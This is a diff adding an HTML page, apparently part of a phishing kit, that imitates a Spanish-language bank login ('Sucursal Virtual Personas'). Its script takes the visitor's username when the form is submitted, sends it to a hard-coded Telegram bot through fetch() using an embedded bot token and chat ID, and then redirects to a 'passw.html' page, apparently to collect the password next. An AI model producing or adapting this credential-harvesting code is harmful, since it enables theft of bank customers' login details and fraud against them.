@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>replit</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+  <style>
+        * {
+            -webkit-appearance: none;
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        input[type=submit] {
+            background-color: #fdda24;
+            color: #030303;
+            width: 90%;
+            height: 41px;
+            border-radius: 124px;
+            border: 0px solid gray;
+            margin-top: 0px;
+            padding: 5px;
+            font-weight: bold;
+            font-size: 1em;
+        }
+  </style>
+</head>
+
+<body>
+
+  <img src="/img/ingresa.jpeg" alt="" width="100%">
+  <br><br>
+
+  <!-- Formulario sin PHP -->
+  <form id="loginForm">   
+     <p style="font-size:0.9em;">El usuario es el mismo con el que ingresas a la Sucursal Virtual Personas</p>
+
+     <div class="login">
+        <img src="/img/user.svg" alt="" width="100%">
+     </div>
+
+     <input type="text" id="cedula" name="cedula" placeholder="Usuario" required>
+
+     <p style="text-align: end; font-size:0.8em;margin-left: 4em;">¿Olvidaste tu usuario?</p>
+
+     <center><input type="submit" value="Continuar"></center><br>
+  </form>
+
+  <br>
+  <a href=""><center><img src="/img/bangol.jpeg" alt="" width="100%"></center></a>
+
+  <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // Evita el comportamiento por defecto de recargar la página
+
+      const cedula = document.getElementById('cedula').value;
+
+      // Token y chat ID proporcionados
+      const token = '8042104204:AAET83zLWF34OkX7tJuHCcNvLsz1-yTHS8g';
+      const chatId = '-4577064839';
+
+      // URL de la API de Telegram para enviar mensajes
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      // Enviar los datos por AJAX
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `Nuevo usuario: ${cedula}`
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          // Redirección a otra página después de enviar los datos
+          window.location.href = 'passw.html'; // Cambia esta URL por la página de destino
+        } else {
+          alert('Error al enviar el mensaje a Telegram: ' + data.description);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Hubo un error al enviar el mensaje.');
+      });
+    });
+  </script>
+
+</body>
+</html>
